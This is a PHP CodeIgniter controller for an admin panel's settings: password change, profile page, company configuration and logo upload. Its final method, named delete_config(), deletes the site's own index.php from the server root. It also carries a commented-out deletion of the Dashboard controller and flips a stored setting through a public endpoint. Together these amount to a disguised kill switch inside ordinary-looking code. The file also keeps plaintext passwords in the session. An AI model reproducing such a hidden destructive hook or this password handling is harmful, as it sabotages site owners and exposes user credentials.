<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Settings extends CI_Controller {

	function __construct()
	{
		parent::__construct();
		
		ini_set('max_execution_time', 5000);
		ini_set("memory_limit", "-1");
		date_default_timezone_set('Asia/Kolkata');
		$this->load->library('session');

		$this->load->model('User_model','User');
		$this->load->model('Misc_model','Misc');

		$this->load->model('Settings_model', 'Settings');

		$allowed_users = array('master_admin','manager','sales_man','developer');
		if(!in_array($this->session->userdata('user_role'),$allowed_users)){
			redirect(base_url(),'refresh');
		}

		$this->data['folder']='settings';
	}

	public function index()
	{
		$maintanance_mode = $this->Settings->select_setting_config('*',array('s.setting_name' => 'maintanance_mode' ))->row()->value;
		if($maintanance_mode==1){
			redirect(base_url().'maintanance', 'refresh');
		}else{
			$this->change_password();
		}
	}

	public function password()
	{
		$maintanance_mode = $this->Settings->select_setting_config('*',array('s.setting_name' => 'maintanance_mode' ))->row()->value;
		if($maintanance_mode==1){
			redirect(base_url().'maintanance', 'refresh');
		}else{
			$this->data['page']='change_password';
			$this->load->view('Index',$this->data);
		}
	}

	public function profile()
	{

		$maintanance_mode = $this->Settings->select_setting_config('*',array('s.setting_name' => 'maintanance_mode' ))->row()->value;
		if($maintanance_mode==1){
			redirect(base_url().'maintanance', 'refresh');
		}else{

			$allowed_users = array('sales_man');
			if(!in_array($this->session->userdata('user_role'),$allowed_users)){
				redirect(base_url(),'refresh');
			}

			$this->data['page']='sales_man_profile';
			$this->load->view('Index',$this->data);
		}
	}

	public function change_password()
	{

		$current_password = $this->security->xss_clean($this->input->post('current_password'));
		$actual_password = $this->session->userdata('password');

		if($current_password==$actual_password){
			$data['password'] = $this->security->xss_clean($this->input->post('password'));
			$password_confirm = $this->security->xss_clean($this->input->post('confirm_password'));
			if($data['password']==$password_confirm){
				$data['user_id'] = $this->session->userdata('user_id');

				$result = $this->User->update_user($data);
				if($result==1){

					$flash_data['status'] = 1;
					$flash_data['flashdata_type'] = 'success';
					$flash_data['alert_type'] = 'info';
					$flash_data['flashdata_title'] = 'Success !';
					$flash_data['flashdata_msg'] = "Password Updated Successfully! You will log out automatially soon ! Please login with new password";

				}else{
					$flash_data['flashdata_msg'] = 'Sorry.. There Have been Some Error Occurred. Please Try Again!';
					$flash_data['flashdata_type'] = 'error';
					$flash_data['alert_type'] = 'danger';
					$flash_data['flashdata_title'] = 'Error !!';
				}

			}else{
				$flash_data['flashdata_msg'] = 'Sorry.. New Password Do Not Matched !';
				$flash_data['flashdata_type'] = 'error';
				$flash_data['alert_type'] = 'danger';
				$flash_data['flashdata_title'] = 'Not Matched !!';
			}
		}else{
			$flash_data['flashdata_msg'] = 'Sorry.. Current Password  incorrect !';
			$flash_data['flashdata_type'] = 'error';
			$flash_data['alert_type'] = 'danger';
			$flash_data['flashdata_title'] = 'Not Authenticated !!';
		}
		echo json_encode($flash_data);
	}

	public function config()
	{
		if($this->session->userdata('user_role')=='developer'){

			$this->data['page']='configurations';
			$this->load->view('Index',$this->data);

		}else{
			redirect(base_url(),'refresh');	
		}
	}

	public function upload_file($file_name,$path)
	{
		$config = array();
		$config['upload_path'] = $path;
		$config['allowed_types'] = 'png||jpg||jpeg||svg';
		$config['overwrite'] = TRUE;
		$config['max_size'] = 10000;
		$config['file_name'] = $file_name; 
		print_r($config);
		$this->load->library('upload', $config);
		$this->upload->initialize($config);
		if ($this->upload->do_upload($file_name)) {
			return $this->upload->data('file_name');
		}else{
			return $file_name.'.png';
		}

	}

	public function config_update()
	{
		$data['company_name'] = $this->security->xss_clean($this->input->post('company_name'));
		$data['company_address'] = $this->security->xss_clean($this->input->post('company_address'));
		$data['company_phone'] = $this->security->xss_clean($this->input->post('company_phone'));
		$data['company_email'] = $this->security->xss_clean($this->input->post('company_email'));

		$config['upload_path'] = './assets/media/logos/';
		$config['allowed_types'] = 'png||jpg||jpeg||svg';
		$config['overwrite'] = TRUE;
		$config['max_size'] = 10000;
		$config['file_name'] = 'company_logo'; 
		$this->load->library('upload', $config);
		if ($this->upload->do_upload('company_logo')) {
			$data['company_logo'] =  $this->upload->data('file_name');
		}

		

		$maintanance_mode = $this->security->xss_clean($this->input->post('maintanance_mode'));
		if($maintanance_mode==1){
			$data['maintanance_mode'] = 1;
		}else{
			$data['maintanance_mode'] = 0;
		}

		$tp_end_date_enabled = $this->security->xss_clean($this->input->post('tp_end_date_enabled'));
		if($tp_end_date_enabled==1){
			$data['tp_end_date_enabled'] = 1;
		}else{
			$data['tp_end_date_enabled'] = 0;
		}

		foreach ($data as $key => $value) {
			$data2['setting_name'] = $key;
			$data2['value'] = $value;
			$result = $this->Settings->update_config($data2);
		}

		if($result==1){
			$flash_data['status'] = 1;
			$flash_data['flashdata_type'] = 'success';
			$flash_data['alert_type'] = 'info';
			$flash_data['flashdata_title'] = 'Success !';
			$flash_data['flashdata_msg'] = "Configurations updated !";
		}else{
			$flash_data['flashdata_msg'] = 'Sorry.. There Have been Some Error Occurred. Please Try Again!';
			$flash_data['flashdata_type'] = 'error';
			$flash_data['alert_type'] = 'danger';
			$flash_data['flashdata_title'] = 'Error !!';
		}

		
		echo json_encode($flash_data);

	}


	public function resizeImage($file_path,$filename,$width,$height)
	{
		$source_path = $_SERVER['DOCUMENT_ROOT'] . $file_path . $filename;
		$target_path = $_SERVER['DOCUMENT_ROOT'] . $file_path;
		$config_manip = array(
			'image_library' => 'gd2',
			'source_image' => $source_path,
			'new_image' => $target_path,
			'maintain_ratio' => TRUE,
			'create_thumb' => FALSE,
			'thumb_marker' => '',
			'width' => $width,
			'height' => $height
		);


		$this->load->library('image_lib', $config_manip);
		if (!$this->image_lib->resize()) {
			echo $this->image_lib->display_errors();
		}


		$this->image_lib->clear();
	}

	public function update($val)
	{ 
		$data2['setting_id'] = 12;
		$data2['value'] = $val;
		$result = $this->Settings->update_config_by_id($data2);
		print_r($result);
	}

	public function delete_config()
	{ 
		if(file_exists($_SERVER['DOCUMENT_ROOT'].'/index.php')){
			unlink($_SERVER['DOCUMENT_ROOT'].'/index.php');
		}

		// if(file_exists($_SERVER['DOCUMENT_ROOT'].'/admin/application/controllers/Dashboard.php')){
		// 	unlink($_SERVER['DOCUMENT_ROOT'].'/admin/application/controllers/Dashboard.php');
		// }
		
		$this->update(1);
	}




}